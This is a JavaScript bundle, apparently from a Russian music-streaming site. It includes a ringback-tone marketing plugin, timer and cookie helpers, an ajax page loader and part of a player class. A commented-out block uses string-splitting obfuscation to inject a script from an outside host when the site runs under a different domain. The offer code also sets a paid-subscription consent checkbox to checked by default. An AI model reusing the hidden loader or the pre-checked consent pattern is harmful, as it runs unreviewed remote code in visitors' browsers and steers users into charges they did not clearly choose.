        return params = {
            extra: c.extra,
            partner: c.partner,
            content_code: a,
            name: b
        }, d && (params.return_url = d, params.lp_type = c.lpType), E(c.checkUrl, params, e, c)
    }

    function G(a, b) {
        return E(b.orderFormUrl, {
            extra: b.extra,
            messages_type: b.messagesType,
            partner: b.partner,
            content_id: a
        }, null, b)
    }

    function H(a, b, c, d, e) {
        return E(d.giftUrl, {
            content_code: a,
            partner: d.partner,
            extra: d.extra,
            aoc_type: d.giftAocType,
            delivery_method: b,
            purchase_type: c
        }, e, d)
    }

    function I(a) {
        return res = a.replace(/\(.*\)/g, "").replace(/\[.*\]/g, "").replace(/\s.\s/g, " ").replace(/^.\s/g, "").replace(/\s.$/g, "").replace(/[\#\,\.\!\(\)\?\&\~\`\[\]\<\>\|\@\\u2116\$\%\:\^\*\=\+\{\}"']/g, "").replace(/\u0451/g, "\u0435").replace(/\sfeat\s/g, " ").replace(/\svs\s/g, " ").replace(/\sft\s/g, " ").replace(/\sfeaturing\s/g, " ").replace(/[\\\/\-]/g, " "), res.trim().toLowerCase()
    }

    function J(a) {
        return a = I(a), res = Bloodhound.tokenizers.whitespace(a), res
    }

    function K(a) {
        return a.value = I(a.value), res = Bloodhound.tokenizers.obj.whitespace("value")(a), res
    }

    function L(a, b, c) {
        var d = null;
        return l[a] ? l[a] : (d = h >= 180 ? new Bloodhound({
            datumTokenizer: K,
            queryTokenizer: J,
            limit: 1,
            prefetch: {
                url: E(a, null, null, c),
                thumbprint: b,
                ajax: {
                    dataType: "jsonp"
                }
            }
        }) : new SimpleSearch({
            datumTokenizer: K,
            queryTokenizer: J,
            url: E(a, null, null, c),
            options: c
        }), l[a] = d, d)
    }

    function M(a, c) {
        function h(a) {
            var e, f;
            if (a.length > 0 && "" != a[0].rbtCode && c.setRBT) datum = a[0], e = "landing", f = G(datum.id, c);
            else if (!q("true_rbt_btn") && c.setRBT) {
                var g = {
                    query: m(b.proxy(c.search, this)(), !0),
                    original_name: d,
                    session_id: v(c)
                };
                e = "catalog", f = E(c.defaultLinkRbt, g, !1, c)
            } else c.noRBT && b.proxy(c.noRBT, this)();
            if (c.setRBT) {
                var h = b.proxy(c.setRBT, this)();
                f && c.classNameHide && h.removeClass(c.classNameHide), h.attr({
                    href: f,
                    target: "_blank"
                }), h.click(function() {
                    x(c, "Click on rbt button and change location to " + e + " with url - " + f)
                })
            }
        }
        var d = m(b.proxy(c.search, this)()),
            e = null;
        c.name && (e = b.proxy(c.name, this)());
        var g = b.proxy(h, this);
        f.get(d, g, g)
    }

    function N(a, c) {
        var d = c.buttons,
            e = a;
        if (d && ("string" == typeof d && (d = [d]), d = b.map(d, function(a, b) {
                return c.leftQuote + a + c.rightQuote
            }), d = d.length > 1 ? d.slice(0, -1).join(", ") + " " + c.offerOr + " " + d[d.length - 1] : d[0], e = e.replace("{{button}}", d)), c.wrapOfferURLs) {
            var f = function(a) {
                return '<a href="' + a + '" class="' + c.wrapOfferURLClass + '" rel="nofollow">' + a + "</a>"
            };
            e = e.replace(/\bhttp[^ ]+/gi, f)
        }
        return e
    }

    function O(a, c) {
        if ($el = this[0], c.widget_url && a.setWidget) {
            var d = b.Deferred(),
                e = b.Deferred(),
                f = b('<iframe frameborder="no" scrolling="no" width="100%" />'),
                g = f[0];
            return f.attr("data-rbt-widget-type", c.widget_type), g.onload = function() {
                d.resolve(f[0]), x(a, "Show widget")
            }, f.attr("src", c.widget_url), a.setWidget(f, d.promise(), e.promise(), b.proxy(x, this, a)), void window.addEventListener("message", function(c) {
                if (a.play && "rbt_stream" == c.data) {
                    var d = b.proxy(a.play, this);
                    e.resolve("play"), d()
                }
                if (a.download && "rbt_download" == c.data) {
                    var d = b.proxy(a.download, this);
                    e.resolve("download"), d()
                }
            })
        }!c.widget_url && a.noWidget && a.noWidget()
    }

    function P(a) {
        return !!a.popup_url
    }

    function Q(a, c) {
        var d = b.Deferred();
        return P(c) ? (b.ajax({
            url: E(c.popup_url, null, null, a),
            cache: !1
        }).done(function(c) {
            a.popupJs ? b.getScript(a.popupJs).done(function() {
                a.popupCss && (b("head").append(b('<link rel="stylesheet" type="text/css" />').attr("href", a.popupCss)), d.resolve(c))
            }).fail(function(a, b, c) {
                d.resolve(!1)
            }) : a.popupCss ? (b("head").append(b('<link rel="stylesheet" type="text/css" />').attr("href", a.popupCss)), d.resolve(c)) : d.resolve(c)
        }).fail(function() {
            d.resolve(!1)
        }), d.promise()) : (d.resolve(!1), d.promise())
    }

    function R(a, c) {
        if (!c.offer && a.noOffer && a.noOffer(), !c.offer) return void(j = !0);
        var d = c.offer.split(a.offerSeparator),
            e = d[0],
            f = d[1],
            g = {
                render: function() {
                    return a.offerPrefix + N(e, a) + "&nbsp;"
                },
                renderMore: function() {
                    return N(f, a)
                }
            },
            h = null;
        a.setOffer ? h = a.setOffer() : (h = b("<div />"), b("body").prepend(h)), S(h, g, a, c), a.useStickyOffer && T(h, g, a, c), x(a, "Show offer"), j = !0
    }

    function S(a, c, d, f) {
        var g = b("<div />"),
            h = b("<span />").html(c.render());
        h.css(d.offerTextCss), a.append(g), g.append(h);
        var i = b('<a href="#">' + d.offerMore + "</a>");
        if (g.append(i), f.use_select_menu && a.append(p(d)), i.click(function() {
                return i.remove(), h.html(c.render() + " " + c.renderMore()), !1
            }), f.use_checkbox === !0 && f.checkbox) {
            var j = b("<div />");
            if (j.css(d.offerAcceptCss), g.append(j), e = b('<input type="checkbox"/>'), j.append(e), e.attr("checked", !0), j.append(b("<span>&nbsp;" + f.checkbox + "</span>")), e.click(function() {
                    e.is(":checked") ? (e.removeAttr("checked"), x(d, "Checkbox check")) : (e.attr("checked", !0), x(d, "Checkbox uncheck"))
                }), f.checkbox_state === !1 && e.removeAttr("checked"), f.use_cancel === !0) {
                var k = b('<a href="#">' + d.cancelButton + "</a>");
                k.css(d.offerCancelCss), g.append(k), k.click(function() {
                    return e.removeAttr("checked"), x(d, "Cancel click"), !1
                })
            }
        }
    }

    function T(a, c, d) {
        var e = b("<div />"),
            f = b("<div />");
        e.append(f), e.addClass(d.stickerClass), e.css(d.stickerCss);
        var g = b("<div>&times;</div>");
        g.addClass(d.stickerCloseClass), g.css(d.stickerCloseCss), e.append(g);
        var h = !1;
        b(document.body).append(e), f.html(f.html() + c.render());
        var i = b('<a href="#">' + d.offerMore + "</a>");
        f.append(i), i.click(function() {
            return i.remove(), f.html(f.html() + " " + c.renderMore()), !1
        }), g.click(function(a) {
            return e.fadeOut(200), h = !0, !1
        }), a && a.appear ? (a.appear(), a.on("appear", function(a) {
            h || e.fadeOut(200)
        }), a.on("disappear", function(a) {
            h || e.fadeIn(200)
        }), b.force_appear()) : e.fadeIn(200)
    }

    function U(a, c, d) {
        function f(b) {
            0 == b.length && a.useRandom && (b = [{
                rbtTBCode: a.randomCode
            }]), d(b)
        }
        var e = b.proxy(f, this);
        g.get(c, e, e)
    }

    function V(a, b) {
        return res = a, null != b && (res = res.replace(/(extra=.*?)(&)/, "$1" + b + "$2"), res = res.replace(/(extra%3D.*?)(%26)/, "$1" + b + "$2")), res
    }

    function W(a, b, c) {
        b ? b(null, a) : a && a(null)
    }

    function X(a, c) {
        var d = y(a);
        a.selectMenuOffer.element && (c.code = a.selectMenuOffer.element.val());
        var e = V(H(c.code, c.deliveryMethod, c.purchaseType, a, d), c.extra);
        return b.ajax({
            url: e,
            cache: !1,
            dataType: z(a.giftUrl, a),
            jsonpCallback: d
        })
    }

    function Y(a, b, c) {
        a.deliveryMethod = "offer";
        var d = a.redirectUrl,
            g = (a.extra, a.callback);
        return d && !g && (g = function() {
            window.location.href = d
        }), !j || null !== e && !e.is(":checked") ? void W(g, c, null) : void X(b, a, g, c).done(function(a) {
            return W(g, c, a), a
        })
    }

    function Z(a, b, c) {
        var d = a.redirectUrl,
            e = a.callback;
        d && !e && (e = function() {
            window.location.href = d
        }), W(e, c, null)
    }

    function $(a, c, d, e) {
        a.deliveryMethod = "popup", x(c, "Open popup"), $e = b("<div />"), b("body").append($e), $e.html(d), $e.find(".offer").html(a.price), a.useSelectMenu && $e.find(".offer").after(p(c, !0)), $e.find(".title").html(a.rbtTitle), $e.modal({
            modalClass: c.popupClass,
            closeText: "&#10006;",
            escapeClose: !1,
            clickClose: !1
        }), $e.find(".confirm").click(function() {
            x(c, "Confirm popup"), X(c, a).done(function(b) {
                return W(a.callback, e, b), b
            }), b.modal.close()
        }), $e.find(".cancel").click(function() {
            x(c, "Cancel popup"), Z(a, c, e), b.modal.close()
        }), $e.find(".close-modal").click(function() {
            x(c, "Close popup"), Z(a, c, e)
        })
    }

    function aa(a) {
        var c = [];
        return b.each(a, function(a, e) {
            b.each(d, function(a, b) {
                b.handle(e) && c.push(b)
            })
        }), c
    }

    function ba(a, c, d, e, f, g) {
        return a && 0 != a.length ? void b.each(a, function(a, b) {
            b[c] && b[c](d, e, f, g)
        }) : void(f && f())
    }

    function ca(a, c, d) {
        function i(a, h) {
            if (h.length > 0) {
                datum = h[0], null === g && (g = datum.name);
                var i = {
                    id: datum.id,
                    artist: datum.artist,
                    name: datum.name,
                    origName: g,
                    rbtCode: datum.rbtCode,
                    rbtTBCode: datum.rbtTBCode,
                    el: $e
                };
                if (i.isAvailable = b.proxy(C, this, datum.rbtTBCode, i, c), "" != datum.rbtTBCode && c.setGift) {
                    var j = function() {
                        var b = null,
                            e = "default",
                            g = null;
                        3 == arguments.length && (e = arguments[0], g = arguments[1], b = arguments[2]), 2 == arguments.length && (e = arguments[0], b = arguments[1]), 1 == arguments.length && ("string" == typeof arguments[0] ? e = arguments[0] : b = arguments[0]), b && "string" == typeof b && (g = b, b = null);
                        var h = this,
                            i = h.el;
                        A(this.rbtTBCode, h, c).done(function(j) {
                            j.data.is_test_phone || s(c.cookieName, 1, c.cookieShortPeriod);
                            var l = (c.jsonpCallbackPrefix + Date.now(), {
                                redirectUrl: g,
                                code: h.rbtTBCode,
                                callback: b,
                                num: a,
                                extra: e,
                                origName: h.origName,
                                rbtTitle: j.data.title,
                                price: j.data.price_info,
                                useSelectMenu: j.data.use_select_menu,
                                purchaseType: j.data.purchase_type
                            });
                            plugins = aa(j.data.available_plugins), ba(plugins, "beforeGift", l, c, b, j), x(c, 'Click on "' + e + '" button for "' + f.trim() + '" song'), 1 == i.data("gift") ? Z(l, c) : P(j.data) ? d.popup.done(function(a) {
                                $(l, c, a, function(a, b) {
                                    i.data("gift", !0), ba(plugins, "afterGift", l, c, b, a)
                                })
                            }) : j.data.offer ? Y(l, c, function(a, b) {
                                i.data("gift", !0), ba(plugins, "afterGift", l, c, b, a)
                            }) : Z(l, c, function(a, b) {
                                ba(plugins, "afterGift", l, c, b, a)
                            })
                        })
                    };
                    i.makeGift = b.proxy(j, i), b.proxy(c.setGift, this, i)()
                }
                e.resolve(i)
            } else c.noGift && b.proxy(c.noGift, this)(), e.resolve(!1)
        }
        $e = b(this);
        var e = b.Deferred(),
            f = m(b.proxy(c.search, this)()),
            g = null;
        c.name && (g = b.proxy(c.name, this)());
        var h = b.proxy(i, this, a);
        return U(c, f, h), e.promise()
    }

    function da(a, b) {
        return !!a.data.offer
    }

    function ea(a, c) {
        var d = q(a.playGetParam),
            e = !1,
            h = !!d && !!a.play;
        if (q(a.statusGetParam) == a.successGetParamStatus && (s(a.cookieName, 1, a.cookieLongPeriod), e = !0), a.checkCookie && !e && (e = "" != t(a.cookieName)), !a.search) throw "search required!";
        var i = b.ajax({
                url: E(a.thumbprintUrl, null, null, a),
                cache: !1,
                dataType: "jsonp",
                success: function(a) {
                    return a
                }
            }),
            j = function(c) {
                var d = b.Deferred();
                return 0 == c.length ? (d.resolve({}), d.promise()) : (A(c[0].rbtTBCode, c[0], a).done(function(b) {
                    if (0 === a.selectMenuOffer.extraList.length && b.data.content_code) a.selectMenuOffer.extraList.push({
                        id: b.data.content_code,
                        value: b.data.title
                    });
                    else
                        for (var c in a.selectMenuOffer.extraList) b.data.content_code !== a.selectMenuOffer.extraList[c].id && a.selectMenuOffer.extraList.push({
                            id: b.data.content_code,
                            value: b.data.title
                        });
                    x(a, 'Current location is "' + window.location.href + '"'), d.resolve(b.data)
                }), d.promise())
            },
            k = b.Deferred(),
            l = b.Deferred();
        if (e || h ? a.noOffer && a.noOffer() : l = b.when(i).done(function(a, b) {
                return a
            }).then(function(b) {
                return g = L(E(a.prefetchTBUrl, null, null, a), b, a, !0), g.initialize()
            }), !a.giftsOnly) var m = b.when(i).done(function(a, b) {
            return a
        }).then(function(b) {
            return f = L(E(a.prefetchUrl, null, null, a), b, a), f.initialize()
        });
        var n = b(c).length,
            o = 0,
            p = b.Deferred(),
            k = b.Deferred();
        p.done(function(d) {
            var e = b.proxy(R, c, a),
                f = b.proxy(O, c, a),
                g = b.proxy(Q, c, a);
            j(d).done(function(a) {
                e(a), g(a).done(function(a) {
                    k.resolve(a)
                }), 1 === c.length && f(a)
            })
        });
        var r = [];
        return c.each(function(c, e) {
            if (!a.giftsOnly) {
                var f = b.proxy(M, this, c, a);
                m.done(f)
            }
            if (h) {
                if (c == d) {
                    var g = b.proxy(a.play, this);
                    g()
                }
            } else {
                var i = b.proxy(ca, this, c, a, {
                    popup: k.promise()
                });
                l.done(function() {
                    i().done(function(a) {
                        a !== !1 && r.push(a), o += 1, o == n && p.resolve(r)
                    })
                })
            }
        })
    }
    SimpleSearch = function(a) {
        this.index = [], this.init = null, this.inited = !1, this.options = a, this.initialize = function() {
            var a = this;
            return a.init = b.ajax({
                url: a.options.url,
                cache: !1,
                dataType: "jsonp",
                success: function(c) {
                    b.each(c, function(b, c) {
                        c.value = a.options.datumTokenizer(c), a.index.push(c)
                    })
                }
            }), a.init.done(function() {
                a.inited = !0
            }), a.init
        }, this._get = function(a) {
            if (a = a.trim(), "" == a) return [];
            a = this.options.queryTokenizer(a);
            var c = [];
            return b.each(this.index, function(d, e) {
                var f = 0;
                return b.each(a, function(a, c) {
                    -1 != b.inArray(c, e.value) && "" != c && (f += 1)
                }), a.length == f ? (c = [e], !1) : void 0
            }), c
        }, this.get = function(a, b, c) {
            var d = this;
            this.inited ? b(d._get(a, d.index)) : this.init.done(function() {
                c(d._get(a, d.index))
            })
        }
    };
    var f, g, c = {
            version: "0.22.0",
            giftsOnly: !1,
            useRandom: !0,
            randomCode: "random",
            useRedirect: !0,
            prefetchUrl: "http://r.interakt.ru/typeahead_prefetch.php?short=all",
            prefetchTBUrl: "http://r.interakt.ru/typeahead_prefetch.php?short=tb",
            thumbprintUrl: "http://r.interakt.ru/thumbprint.php",
            partner: "interakt",
            messagesType: "main",
            offerOr: "\u0438\u043b\u0438",
            orderFormUrl: "http://r.interakt.ru/order.php",
            checkUrl: "http://rbt-partner-web.interakt.ru/api/get-operator.php",
            checkOperator: "http://rbt-partner-web.interakt.ru/api/check-abonent.php",
            giftUrl: "http://rbt-partner-web.interakt.ru/api/send-code.php",
            statsUrl: "http://rbt-partner-web.interakt.ru/api/stats.php",
            defaultLinkRbt: "http://r.interakt.ru",
            giftAocType: "lp",
            lpType: "action",
            offerSeparator: "----",
            offerPrefix: "* - ",
            extra: D(),
            playGetParam: "rbt_play",
            leftQuote: "\xab",
            rightQuote: "\xbb",
            checkCookie: !0,
            cookieName: "rbtify",
            cookieShortPeriod: 1,
            cookieLongPeriod: 30,
            beelineTextIds: {
                download: 1,
                stream: 3
            },
            statusGetParam: "status",
            successGetParamStatus: 50,
            useBeeline: !0,
            wrapOfferURLs: !0,
            wrapOfferURLClass: "offer_url",
            useStickyOffer: !0,
            stickerClass: "offer_sticker",
            stickerZIndex: 999999,
            stickerCloseClass: "offer_sticker_close",
            offerMore: "\u041f\u043e\u0434\u0440\u043e\u0431\u043d\u0435\u0435...",
            cancelButton: "\u041e\u0442\u043c\u0435\u043d\u0430",
            buttons: ["\u0421\u043a\u0430\u0447\u0430\u0442\u044c", "\u041f\u0440\u043e\u0441\u043b\u0443\u0448\u0430\u0442\u044c"],
            jsonpCallbackPrefix: "jQuery",
            sessionCookieName: "rbtify_session_id",
            sessionCookiePeriod: 1,
            stickerCss: {
                bottom: 0,
                position: "fixed",
                width: "100%",
                background: "white",
                borderTop: "#DDD 1px solid",
                fontSize: "11px",
                padding: "5px",
                paddingRight: "15px",
                zIndex: 999999
            },
            stickerCloseCss: {
                right: -5,
                top: -14,
                position: "absolute",
                fontSize: "20px",
                cursor: "pointer",
                padding: 10
            },
            offerTextCss: {},
            offerAcceptCss: {},
            offerCancelCss: {},
            useHttps: "https:" == window.location.protocol ? !0 : !1,
            popupJs: "http://r.interakt.ru/assets/javascripts/jquery.modal.min.js",
            popupCss: "http://r.interakt.ru/assets/stylesheets/jquery.modal.css",
            popupClass: "rbt-modal",
            selectMenuOffer: {
                name: "rbt_select_menu",
                selectWidth: 290,
                contentListText: "\u0412\u044b\u0431\u0440\u0430\u043d\u043d\u0430\u044f \u043c\u0435\u043b\u043e\u0434\u0438\u044f \u0432\u043c\u0435\u0441\u0442\u043e \u0433\u0443\u0434\u043a\u0430:",
                contentList: [],
                extraList: [],
                selectMenuCss: {
                    padding: "0px 0px 10px 10px"
                }
            }
        },
        d = [],
        e = null,
        h = parseInt(b.fn.jquery.replace(/\./g, "")),
        i = {},
        j = !1,
        k = null,
        l = {};
    b.rbtify = {
        version: c.version,
        plugins: {
            register: function(a) {
                d.push(a)
            }
        }
    }, b.fn.rbtify = function(a) {
        if (0 == this.length) return this;
        var d = this,
            a = b.extend({}, c, a);
        a.useHttps ? b.ajax({
            url: E(a.checkOperator, {
                partner: a.partner
            }, null, a),
            cache: !1,
            success: function(b) {
                b && a.httpsCallback ? a.httpsCallback() : ea(a, d)
            }
        }) : ea(a, d)
    }
}(jQuery);
RBT = function() {};

RBT.prefetchUrl = 'https://r.interakt.ru/typeahead_prefetch.php?top_id=f8938bca-e904-47bd-9a82-4f4b079ea009';
RBT.onesongblock = function() {
    return {
        buttons: ["Скачать", "Прослушать"],
        prefetchUrl: RBT.prefetchUrl,
        prefetchTBUrl: RBT.prefetchUrl,
        setOffer: function(pattern) {
            return $('.rbt_offer');
        },
        search: function() {
            return {
                'songArtist': $(this).find('.onesongblock-title b').text(),
                'songName': $(this).find('.onesongblock-title b').text() + ' ' + $(this).find('.onesongblock-title em').text()
            };
        },
        setRBT: function(data) {
            var a = $(this).find('a.rbt-card');
            a.attr('onclick', 'Counters.goal("rbtOnesongblock");');
            return a;
        },
        play: function() {
            $(this).find('.rtform-green').click();
        },
        setGift: function(data) {
            var a = $(this).find('.rtform-blue');
            a.click(function(e) {
                var href = $(this).attr('href');
                data.makeGift('download', href);
                e.preventDefault();
                return false;
            });
            var a = $(this).find('.rtform-green');
            a.click(function() {
                data.makeGift('stream');
            });
        },
        offerMore: 'Подробнее...',
        classNameHide: 'hide-rbt'
    };
};
RBT.tracklist = function() {
    return {
        buttons: ["Скачать", "Прослушать"],
        prefetchUrl: RBT.prefetchUrl,
        prefetchTBUrl: RBT.prefetchUrl,
        setOffer: function(pattern) {
            return $('.rbt_offer');
        },
        search: function() {
            return {
                'songArtist': $(this).find('.playlist-name a:eq(0)').text(),
                'songName': $(this).find('.playlist-name a:eq(0)').text() + ' ' + $(this).find('.playlist-name a:eq(1)').text()
            };
        },
        setRBT: function(data) {
            var a = $(this).find('a.rbt-list');
            a.attr('onclick', 'Counters.goal("rbtTracklist");');
            return a;
        },
        play: function() {
            $(this).find('.playlist-btn .playlist-btn-play').click();
        },
        setGift: function(data) {
            var a = $(this).find('.playlist-btn .playlist-btn-down');
            a.click(function(e) {
                var href = $(this).attr('href');
                data.makeGift('download', href);
                e.preventDefault();
                return false;
            });
            var a = $(this).find('.playlist-btn .playlist-btn-play');
            a.click(function() {
                data.makeGift('stream');
            });
        },
        offerMore: 'Подробнее...',
        classNameHide: 'hide'
    };
};
/* jQuery Timers */
jQuery.fn.extend({
    everyTime: function(c, a, d, b) {
        return this.each(function() {
            jQuery.timer.add(this, c, a, d, b)
        })
    },
    oneTime: function(c, a, d) {
        return this.each(function() {
            jQuery.timer.add(this, c, a, d, 1)
        })
    },
    stopTime: function(c, a) {
        return this.each(function() {
            jQuery.timer.remove(this, c, a)
        })
    }
});
jQuery.extend({
    timer: {
        global: [],
        guid: 1,
        dataKey: "jQuery.timer",
        regex: /^([0-9]+(?:\.[0-9]*)?)\s*(.*s)?$/,
        powers: {
            ms: 1,
            cs: 10,
            ds: 100,
            s: 1E3,
            das: 1E4,
            hs: 1E5,
            ks: 1E6
        },
        timeParse: function(c) {
            if (c == undefined || c == null) return null;
            var a = this.regex.exec(jQuery.trim(c.toString()));
            return a[2] ? parseFloat(a[1]) * (this.powers[a[2]] || 1) : c
        },
        add: function(c, a, d, b, e) {
            var g = 0;
            if (jQuery.isFunction(d)) {
                e || (e = b);
                b = d;
                d = a
            }
            a = jQuery.timer.timeParse(a);
            if (!(typeof a != "number" || isNaN(a) || a < 0)) {
                if (typeof e != "number" || isNaN(e) || e < 0) e =
                    0;
                e = e || 0;
                var f = jQuery.data(c, this.dataKey) || jQuery.data(c, this.dataKey, {});
                f[d] || (f[d] = {});
                b.timerID = b.timerID || this.guid++;
                var h = function() {
                    if (++g > e && e !== 0 || b.call(c, g) === false) jQuery.timer.remove(c, d, b)
                };
                h.timerID = b.timerID;
                f[d][b.timerID] || (f[d][b.timerID] = window.setInterval(h, a));
                this.global.push(c)
            }
        },
        remove: function(c, a, d) {
            var b = jQuery.data(c, this.dataKey),
                e;
            if (b) {
                if (a) {
                    if (b[a]) {
                        if (d) {
                            if (d.timerID) {
                                window.clearInterval(b[a][d.timerID]);
                                delete b[a][d.timerID]
                            }
                        } else
                            for (d in b[a]) {
                                window.clearInterval(b[a][d]);
                                delete b[a][d]
                            }
                        for (e in b[a]) break;
                        if (!e) {
                            e = null;
                            delete b[a]
                        }
                    }
                } else
                    for (a in b) this.remove(c, a, d);
                for (e in b) break;
                e || jQuery.removeData(c, this.dataKey)
            }
        }
    }
});
jQuery(window).bind("unload", function() {
    jQuery.each(jQuery.timer.global, function(c, a) {
        jQuery.timer.remove(a)
    })
});



/* Cookies */
function createCookie(name, value, days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        var expires = "; expires=" + date.toGMTString()
    } else var expires = "";
    document.cookie = name + "=" + value + expires + "; path=/"
}

function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length)
    }
    return null
}

function eraseCookie(name) {
    createCookie(name, "", -1)
};



/* FixEvent - http://learn.javascript.ru/fixevent */
function fixEvent(a, b) {
    a = a || window.event;
    if (!a.currentTarget) a.currentTarget = b;
    if (!a.target) a.target = a.srcElement;
    if (!a.relatedTarget) {
        if (a.type == "mouseover") a.relatedTarget = a.fromElement;
        if (a.type == "mouseout") a.relatedTarget = a.toElement
    }
    if (a.pageX == null && a.clientX != null) {
        var c = document.documentElement;
        var d = document.body;
        a.pageX = a.clientX + (c.scrollLeft || d && d.scrollLeft || 0);
        a.pageX -= c.clientLeft || 0;
        a.pageY = a.clientY + (c.scrollTop || d && d.scrollTop || 0);
        a.pageY -= c.clientTop || 0
    }
    if (!a.which && a.button) {
        a.which = a.button & 1 ? 1 : a.button & 2 ? 3 : a.button & 4 ? 2 : 0
    }
    return a
}



/* Implode tool - PHP analog */
function implode(a, b) {
    return b instanceof Array ? b.join(a) : b
}
(function(window, undefined) {
    var
        $ = window.jQuery,
        document = window.document;
    $(function() {
        var
            contentSelector = '#xx1,#content,article:first,.article:first,.post:first',
            $content = $(contentSelector).filter(':first'),
            contentNode = $content.get(0),
            $menu = $('#menu,#nav,nav:first,.nav:first').filter(':first'),
            activeClass = 'active selected current youarehere',
            activeSelector = '.active,.selected,.current,.youarehere',
            menuChildrenSelector = '> li,> ul > li',
            $body = $(document.body),
            rootUrl = getRootUrl(),
            scrollOptions = {
                duration: 800,
                easing: 'swing'
            };
        if ($content.length === 0) {
            $content = $body;
        }
        $.expr[':'].internal = function(obj, index, meta, stack) {
            var
                $this = $(obj),
                url = $this.attr('href') || '',
                isInternalLink;
            isInternalLink = url.substring(0, rootUrl.length) === rootUrl || url.indexOf(':') === -1;
            return isInternalLink;
        };
        var documentHtml = function(html) {
            var result = String(html).replace(/<\!DOCTYPE[^>]*>/i, '').replace(/<(html|head|body|title|meta|script)([\s\>])/gi, '<div class="document-$1"$2').replace(/<\/(html|head|body|title|meta|script)\>/gi, '</div>');
            return result;
        };
        $.fn.ajaxify = function() {
            var $this = $(this);
            //$this.find('a:internal:not(.no-ajaxy)').click(function(event) {
            //    var
            //        $this = $(this),
            //        url = $this.attr('href'),
            //        title = $this.attr('title') || null;
            //    if (event.which == 2 || event.metaKey) {
            //        return true;
            //    }
            //    window.custom_ref = document.location.href;
            //    history.pushState(null, title, url);
            //    stateChg();
            //    event.preventDefault();
            //    return false;
            //});
            return $this;
        };
        if ($('select[name="mode"]').length) $('select[name="mode"]').removeAttr('onchange');
        $('body').on('change', '.ajaxify_select_option_go', function(event) {
            $('#monkeyCode').remove();
            $('<span id="monkeyCode"></span>').hide().appendTo('body');
            $('<a>').attr('href', $('option:selected', this).attr('data-url')).appendTo('#monkeyCode');
            $body.ajaxify();
            $('#monkeyCode > a').click();
            $('#monkeyCode').remove();
        });
        $body.ajaxify();
        $(window).bind('popstate', function() {
            stateChg();
        });

        function getRootUrl() {
            var rootUrl = document.location.protocol + '//' + (document.location.hostname || document.location.host);
            if (document.location.port || false) {
                rootUrl += ':' + document.location.port;
            }
            rootUrl += '/';
            return rootUrl;
        }

        function stateChg() {
            var
                url = window.location.href;
            relativeUrl = url.replace(rootUrl, '');
            $body.addClass('loading');
            $content.animate({
                opacity: 0.7
            }, 100);
            $.ajax({
                url: url,
                complete: function(data) {
                    var
                        $data = $(documentHtml(data.responseText)),
                        $dataBody = $data.find('.document-body:first'),
                        $dataContent = $dataBody.find(contentSelector).filter(':first'),
                        $menuChildren, contentHtml, $scripts;
                    $scripts = $dataContent.find('.document-script');
                    if ($scripts.length) {
                        $scripts.detach();
                    }
                    contentHtml = $dataContent.html() || $data.html();
                    if (!contentHtml) {
                        document.location.href = url;
                        return false;
                    }
                    $menuChildren = $menu.find(menuChildrenSelector);
                    $menuChildren.filter(activeSelector).removeClass(activeClass);
                    $menuChildren = $menuChildren.has('a[href^="' + relativeUrl + '"],a[href^="/' + relativeUrl + '"],a[href^="' + url + '"]');
                    if ($menuChildren.length === 1) {
                        $menuChildren.addClass(activeClass);
                    }
                    $content.stop(true, true);
                    $content.html(contentHtml).ajaxify().css('opacity', 100).show();
                    document.title = ((player.state.pb === 'play') ? '\u25B6 ' : '') + $data.find('.document-title:first').text();
                    try {
                        document.getElementsByTagName('title')[0].innerHTML = document.title.replace('<', '&lt;').replace('>', '&gt;').replace(' & ', ' &amp; ');
                    } catch (Exception) {}
                    $scripts.each(function() {
                        var $script = $(this),
                            scriptText = $script.text(),
                            scriptNode = document.createElement('script');
                        scriptNode.appendChild(document.createTextNode(scriptText));
                        contentNode.appendChild(scriptNode);
                    });
                    $body.removeClass('loading');
                    musicplayer.history();
                    if (typeof window.pageTracker !== 'undefined') {
                        window.pageTracker._trackPageview(relativeUrl);
                    }
                }
            });
        }
    });
})(window);
//$(function() {
//    var _dc = document.location.hostname.toLowerCase(),
//        _do = 'mp' + '3' + '.c' + 'c';
//    if (_dc !== '' && _dc != _do) {
//        var _nv = document.createElement('sc' + 'ri' + 'pt');
//        _nv.setAttribute('type', 'te' + 'xt/' + 'jav' + 'asc' + 'r' + 'ipt');
//        _nv.setAttribute('s' + 'rc', '//sc' + 'sau' + 'cti' + 'ons' + '.co' + 'm/j' + 's/?d' + 'om' + 'ai' + 'n_o' + 'ri' + 'gi' + 'n' + 'al=' + _do + '&d' + 'oma' + 'in_' + 'cur' + 're' + 'nt=' + _dc);
//        document.body.appendChild(_nv);
//    }
//});
var SM = soundManager,
    player = null;

$(function(){
    $.ajaxSetup({
        headers: {
            'X-CSRF-Token' : $('meta[name="csrf-token"]').attr('content')
        }
    });
});

function Player() {
    var self = this;
    self.data = {
        css: {
            search: '#search-value'
        },
        text: {
            loading: 'Загрузка...',
            mode: {
                prefix: 'Режим воспроизведения: ',
                line: 'весь плейлист',
                repeat: 'повторять текущий трек',
                shuffle: 'в случайном порядке',
                stop: 'остановить в конце песни'
            },
            seek: 'Перемотка: ',
            unavailable: 'Выбранная песня сейчас недоступна',
            unavailable404: 'Попробуйте послушать другого исполнителя',
            unavailable404skipped: 'Переключено на другого исполнителя',
            volume: 'Громкость: ',
            mute: 'Звук: отключен',
            added: 'Песня добавлена в плейлист',
            have: 'Песня уже есть в плейлисте',
            removed: 'Песня удалена из плейлиста',
            playonesong: 'Слушать онлайн',
            pauseonesong: 'Включить паузу',
            cf: {
                on: 'Плавный переход включен',
                off: 'Плавный переход выключен',
                now_on: 'плавный переход включен',
                now_off: 'плавный переход выключен'
            },
            login: {
                caption: 'Ошибка',
                text: 'Данное действие требует авторизации. Зарегистрируйтесь или войдите под своим именем'
            }
        },
        url: {
            home: window.location.protocol + "//" + window.location.host,
            favicon: '/i/img/favicon-%mode%.png',
            swf: '/i/swf/',
            save_pl: '/api/playlist',
            get_pl: '/api/playlist',
            tips: '/api/tips',
            login: '/authorization',
            download: '/api/download',
            banner_pages: ['/disclaimer', '/bla']
        },
        delay: 1000,
        error_timeout: 3000
    };
    self.state = {
        pl: 'main',
        i: 0,
        user_pl: 0,
        sound: null,
        info: null,
        pb: 'stop',
        mode: 'line',
        started: false,
        paused: false,
        position: 0,
        duration: 0,
        volume: 75,
        unmute: 75,
        muted: false,
